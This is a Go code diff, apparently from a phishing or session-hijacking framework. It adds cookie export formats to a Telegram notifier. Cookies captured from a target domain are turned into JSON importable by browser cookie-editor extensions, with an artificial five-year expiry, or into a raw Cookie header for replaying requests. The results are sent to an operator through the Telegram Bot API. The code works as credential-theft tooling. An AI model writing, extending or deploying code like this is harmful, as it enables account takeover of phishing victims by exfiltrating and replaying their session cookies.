@@ -48,6 +48,9 @@ type TelegramSettings struct {
 	DataLevel string `json:"dataLevel"`
 	// SendCookieFile when true attaches captured cookies as a .txt file.
 	SendCookieFile bool `json:"sendCookieFile"`
+	// CookieFormat controls the format of the cookie file attachment.
+	// Supported values: "netscape" (default), "json", "header".
+	CookieFormat string `json:"cookieFormat,omitempty"`
 }
 
 // GetSettings loads the current Telegram settings from the option store.
@@ -98,9 +101,20 @@ func (t *Telegram) Notify(
 	// check if we should attach a cookie file
 	hasCookies := false
 	var cookieFileContent string
+	var cookieFileName string
 	if settings.SendCookieFile && settings.DataLevel == model.WebhookDataLevelFull {
 		if cookies, ok := capturedData["cookies"]; ok {
-			cookieFileContent = t.formatCookiesNetscape(cookies, capturedData)
+			switch settings.CookieFormat {
+			case "json":
+				cookieFileContent = t.formatCookiesJSON(cookies, capturedData)
+				cookieFileName = "cookies.json"
+			case "header":
+				cookieFileContent = t.formatCookiesHeader(cookies, capturedData)
+				cookieFileName = "cookies.txt"
+			default: // "netscape" or empty (backward-compatible)
+				cookieFileContent = t.formatCookiesNetscape(cookies, capturedData)
+				cookieFileName = "cookies.txt"
+			}
 			hasCookies = cookieFileContent != ""
 		}
 	}
@@ -108,7 +122,7 @@ func (t *Telegram) Notify(
 	// send in background so we never block the request
 	go func() {
 		if hasCookies {
-			if err := t.sendDocument(settings, msg, "cookies.txt", []byte(cookieFileContent)); err != nil {
+			if err := t.sendDocument(settings, msg, cookieFileName, []byte(cookieFileContent)); err != nil {
 				t.Logger.Errorw("telegram: failed to send document", "error", err)
 			}
 		} else {
@@ -258,6 +272,142 @@ func (t *Telegram) formatCookiesNetscape(cookies interface{}, capturedData map[s
 	}
 
 	return sb.String()
+}
+
+// normalizeCookieList is a shared helper that normalizes cookies from various input types
+// into a uniform []map[string]interface{} slice.
+func (t *Telegram) normalizeCookieList(cookies interface{}) []map[string]interface{} {
+	var cookieList []map[string]interface{}
+	switch v := cookies.(type) {
+	case map[string]interface{}:
+		for _, cookieData := range v {
+			if cd, ok := cookieData.(map[string]interface{}); ok {
+				cookieList = append(cookieList, cd)
+			}
+		}
+	case []interface{}:
+		for _, cookieData := range v {
+			if cd, ok := cookieData.(map[string]interface{}); ok {
+				cookieList = append(cookieList, cd)
+			}
+		}
+	case string:
+		var arr []map[string]interface{}
+		if err := json.Unmarshal([]byte(v), &arr); err == nil {
+			cookieList = arr
+		} else {
+			var m map[string]interface{}
+			if err := json.Unmarshal([]byte(v), &m); err == nil {
+				for _, cookieData := range m {
+					if cd, ok := cookieData.(map[string]interface{}); ok {
+						cookieList = append(cookieList, cd)
+					}
+				}
+			}
+		}
+	}
+	return cookieList
+}
+
+// formatCookiesJSON converts captured cookie data to a JSON array format
+// compatible with browser extensions like Cookie Editor and EditThisCookie.
+func (t *Telegram) formatCookiesJSON(cookies interface{}, capturedData map[string]interface{}) string {
+	cookieList := t.normalizeCookieList(cookies)
+	if len(cookieList) == 0 {
+		return ""
+	}
+
+	targetDomain := ""
+	if td, ok := capturedData["target_domain"].(string); ok {
+		targetDomain = td
+	}
+
+	type exportCookie struct {
+		Name           string  `json:"name"`
+		Value          string  `json:"value"`
+		Domain         string  `json:"domain"`
+		Path           string  `json:"path"`
+		ExpirationDate float64 `json:"expirationDate,omitempty"`
+		HttpOnly       bool    `json:"httpOnly"`
+		Secure         bool    `json:"secure"`
+		SameSite       string  `json:"sameSite,omitempty"`
+		HostOnly       bool    `json:"hostOnly"`
+		Session        bool    `json:"session"`
+		StoreId        string  `json:"storeId"`
+	}
+
+	var exported []exportCookie
+	for _, cd := range cookieList {
+		domain := targetDomain
+		if d, ok := cd["domain"].(string); ok && d != "" {
+			domain = d
+		}
+		if oh, ok := cd["original_host"].(string); ok && oh != "" {
+			domain = oh
+		}
+		name, _ := cd["name"].(string)
+		value, _ := cd["value"].(string)
+		path := "/"
+		if p, ok := cd["path"].(string); ok && p != "" {
+			path = p
+		}
+		secure := false
+		if s, ok := cd["secure"].(string); ok && s == "true" {
+			secure = true
+		} else if s, ok := cd["secure"].(bool); ok {
+			secure = s
+		}
+		httpOnly := false
+		if ho, ok := cd["httpOnly"].(string); ok && ho == "true" {
+			httpOnly = true
+		} else if ho, ok := cd["httpOnly"].(bool); ok {
+			httpOnly = ho
+		}
+		sameSite := "no_restriction"
+		if ss, ok := cd["sameSite"].(string); ok && ss != "" {
+			sameSite = ss
+		}
+
+		exported = append(exported, exportCookie{
+			Name:           name,
+			Value:          value,
+			Domain:         domain,
+			Path:           path,
+			ExpirationDate: float64(time.Now().Add(5 * 365 * 24 * time.Hour).Unix()),
+			HttpOnly:       httpOnly,
+			Secure:         secure,
+			SameSite:       sameSite,
+			HostOnly:       !strings.HasPrefix(domain, "."),
+			Session:        false,
+			StoreId:        "0",
+		})
+	}
+
+	data, err := json.MarshalIndent(exported, "", "    ")
+	if err != nil {
+		return ""
+	}
+	return string(data)
+}
+
+// formatCookiesHeader converts captured cookie data to a Cookie header string
+// (name=value; name2=value2) suitable for direct use in HTTP requests.
+func (t *Telegram) formatCookiesHeader(cookies interface{}, capturedData map[string]interface{}) string {
+	cookieList := t.normalizeCookieList(cookies)
+	if len(cookieList) == 0 {
+		return ""
+	}
+
+	var parts []string
+	for _, cd := range cookieList {
+		name, _ := cd["name"].(string)
+		value, _ := cd["value"].(string)
+		if name != "" && value != "" {
+			parts = append(parts, fmt.Sprintf("%s=%s", name, value))
+		}
+	}
+
+	return strings.Join(parts, "; ")
 }
 
 // sendMessage sends a text message via the Telegram Bot API.
